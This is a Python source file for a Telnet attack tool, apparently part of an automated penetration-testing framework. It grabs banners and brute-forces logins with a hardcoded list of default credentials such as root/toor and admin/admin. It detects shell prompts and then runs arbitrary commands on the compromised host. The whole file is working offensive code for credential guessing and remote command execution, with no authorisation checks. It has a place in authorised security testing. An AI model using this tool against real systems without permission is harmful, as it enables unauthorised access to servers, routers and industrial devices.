"""
TIRPAN — Telnet Probe Tool
============================
Connects to Telnet (port 23) and attempts authentication with
a list of default credentials. Also performs banner grabbing.

Telnet is still found on:
- Legacy Linux servers (Metasploitable2, old routers)
- Industrial control systems and embedded devices
- Network equipment (Cisco, Juniper with default configs)

Default credentials attempted (in order of likelihood):
  root / (blank)
  root / root
  root / toor
  admin / admin
  admin / (blank)
  admin / password
  user / user
  guest / guest
"""

from __future__ import annotations

import asyncio
import logging
import re

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_DEFAULT_PORT    = 23
_CONNECT_TIMEOUT = 10
_READ_TIMEOUT    = 5
_CMD_TIMEOUT     = 8

# Default credentials to try (username, password)
_DEFAULT_CREDS = [
    ("root",  ""),
    ("root",  "root"),
    ("root",  "toor"),
    ("root",  "password"),
    ("root",  "1234"),
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "password"),
    ("admin", "1234"),
    ("user",  "user"),
    ("guest", "guest"),
    ("cisco", "cisco"),
    ("enable",""),
]

# Patterns that indicate a successful login
_LOGIN_SUCCESS_PATTERNS = [
    re.compile(r"\$\s*$"),              # $ prompt
    re.compile(r"#\s*$"),               # # prompt (root)
    re.compile(r">\s*$"),               # > prompt
    re.compile(r"bash-[\d.]+[#$]"),     # bash prompt
    re.compile(r"sh-[\d.]+[#$]"),       # sh prompt
    re.compile(r"Last login:"),         # successful login message
    re.compile(r"Welcome to"),          # welcome banner
]

# Patterns that indicate failed login
_LOGIN_FAIL_PATTERNS = [
    re.compile(r"Login incorrect", re.IGNORECASE),
    re.compile(r"Authentication failed", re.IGNORECASE),
    re.compile(r"Permission denied", re.IGNORECASE),
    re.compile(r"Invalid password", re.IGNORECASE),
]

# Telnet IAC (Interpret As Command) negotiation stripping
def _strip_telnet_iac(data: bytes) -> bytes:
    """Strip Telnet IAC negotiation sequences from data."""
    result = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xFF and i + 2 < len(data):  # IAC
            i += 3  # skip IAC + command + option
        else:
            result.append(data[i])
            i += 1
    return bytes(result)


class TelnetTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="telnet_probe",
            category="exploit-exec",
            description=(
                "Probes Telnet service (port 23) for default credentials and "
                "unauthenticated access. Attempts common default username/password "
                "combinations used on legacy Linux, routers, and embedded devices. "
                "Actions:\n"
                "  check   — grab banner and check if service responds\n"
                "  brute   — try all default credential combinations\n"
                "  exec    — execute a command using known credentials"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address",
                    },
                    "action": {
                        "type": "string",
                        "description": "'check' | 'brute' | 'exec'",
                        "default": "brute",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "Telnet port (default: 23)",
                        "default": 23,
                    },
                    "username": {
                        "type": "string",
                        "description": "Username for action=exec",
                        "default": "root",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password for action=exec (blank string for no password)",
                        "default": "",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to run after login (action=exec)",
                        "default": "id && uname -a",
                    },
                },
                "required": ["target_ip"],
            },
        )

    async def execute(self, params: dict) -> dict:
        target_ip   = params.get("target_ip", "").strip()
        action      = params.get("action", "brute")
        target_port = int(params.get("target_port", _DEFAULT_PORT))

        if not target_ip:
            return {"success": False, "output": None, "error": "target_ip is required"}

        if action == "check":
            return await self._banner_grab(target_ip, target_port)
        elif action == "brute":
            return await self._brute_credentials(target_ip, target_port)
        elif action == "exec":
            username = params.get("username", "root")
            password = params.get("password", "")
            command  = params.get("command", "id && uname -a")
            return await self._exec_command(target_ip, target_port, username, password, command)
        return {"success": False, "output": None, "error": f"Unknown action: {action}"}

    async def _banner_grab(self, ip: str, port: int) -> dict:
        """Connect and read the Telnet banner."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=_CONNECT_TIMEOUT,
            )
        except Exception as e:
            return {"success": False, "output": None,
                    "error": f"Cannot connect to {ip}:{port} — {e}"}

        try:
            raw = await asyncio.wait_for(reader.read(1024), timeout=_READ_TIMEOUT)
            banner = _strip_telnet_iac(raw).decode(errors="replace").strip()
            return {
                "success": True,
                "output": {
                    "banner": banner[:500],
                    "port":   port,
                    "note":   "Telnet service is running. Use action=brute to test credentials.",
                },
                "error": None,
            }
        except asyncio.TimeoutError:
            return {"success": True, "output": {"banner": "(no banner)", "port": port}, "error": None}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _brute_credentials(self, ip: str, port: int) -> dict:
        """Try all default credentials sequentially."""
        tried = []
        for username, password in _DEFAULT_CREDS:
            result = await self._try_login(ip, port, username, password)
            tried.append({
                "username": username,
                "password": password if password else "(blank)",
                "success":  result["success"],
            })
            if result["success"]:
                return {
                    "success": True,
                    "output": {
                        "username":    username,
                        "password":    password if password else "(blank)",
                        "banner":      result.get("banner", ""),
                        "shell_output": result.get("shell_output", ""),
                        "tried":       tried,
                        "note": (
                            f"Telnet login successful with {username}:{password or '(blank)'}. "
                            f"Use action=exec to run commands."
                        ),
                    },
                    "error": None,
                }
            await asyncio.sleep(0.3)  # brief pause between attempts

        return {
            "success": False,
            "output": {
                "tried": tried,
                "note":  "No default credentials worked. Service may use non-default passwords.",
            },
            "error": None,
        }

    async def _try_login(
        self, ip: str, port: int, username: str, password: str
    ) -> dict:
        """Attempt a single Telnet login."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=_CONNECT_TIMEOUT,
            )
        except Exception:
            return {"success": False}

        try:
            # Read banner + login prompt
            banner_raw = b""
            try:
                banner_raw = await asyncio.wait_for(reader.read(2048), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass

            banner = _strip_telnet_iac(banner_raw).decode(errors="replace")

            # Send username
            writer.write((username + "\r\n").encode())
            await writer.drain()

            # Wait for password prompt
            resp1 = b""
            try:
                resp1 = await asyncio.wait_for(reader.read(512), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass
            resp1_str = _strip_telnet_iac(resp1).decode(errors="replace")

            # If we already see a shell prompt after just username (no-auth)
            if self._is_shell_prompt(resp1_str):
                cmd_out = await self._run_command_on_stream(reader, writer, "id")
                return {"success": True, "banner": banner, "shell_output": cmd_out}

            # Send password
            writer.write((password + "\r\n").encode())
            await writer.drain()

            resp2 = b""
            try:
                resp2 = await asyncio.wait_for(reader.read(1024), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass
            resp2_str = _strip_telnet_iac(resp2).decode(errors="replace")

            if any(p.search(resp2_str) for p in _LOGIN_FAIL_PATTERNS):
                return {"success": False}

            if self._is_shell_prompt(resp2_str):
                cmd_out = await self._run_command_on_stream(reader, writer, "id")
                return {"success": True, "banner": banner, "shell_output": cmd_out}

            return {"success": False}

        except Exception as e:
            logger.debug("Telnet login attempt failed: %s", e)
            return {"success": False}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _exec_command(
        self, ip: str, port: int, username: str, password: str, command: str
    ) -> dict:
        """Login with known credentials and execute a command."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=_CONNECT_TIMEOUT,
            )
        except Exception as e:
            return {"success": False, "output": None,
                    "error": f"Cannot connect to {ip}:{port} — {e}"}

        try:
            # Read and discard banner
            try:
                await asyncio.wait_for(reader.read(2048), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass

            writer.write((username + "\r\n").encode())
            await writer.drain()
            try:
                await asyncio.wait_for(reader.read(512), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass

            writer.write((password + "\r\n").encode())
            await writer.drain()
            try:
                await asyncio.wait_for(reader.read(512), timeout=_READ_TIMEOUT)
            except asyncio.TimeoutError:
                pass

            output = await self._run_command_on_stream(reader, writer, command)
            return {
                "success": bool(output),
                "output": {
                    "command":  command,
                    "output":   output,
                    "username": username,
                },
                "error": None,
            }
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _run_command_on_stream(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, command: str
    ) -> str:
        writer.write((command + "\r\n").encode())
        await writer.drain()
        try:
            raw = await asyncio.wait_for(reader.read(4096), timeout=_CMD_TIMEOUT)
            return _strip_telnet_iac(raw).decode(errors="replace").strip()
        except asyncio.TimeoutError:
            return ""

    def _is_shell_prompt(self, text: str) -> bool:
        return any(p.search(text) for p in _LOGIN_SUCCESS_PATTERNS)

    async def health_check(self) -> ToolHealthStatus:
        return ToolHealthStatus(
            available=True,
            message="telnet_probe (pure Python, no binary required)",
        )
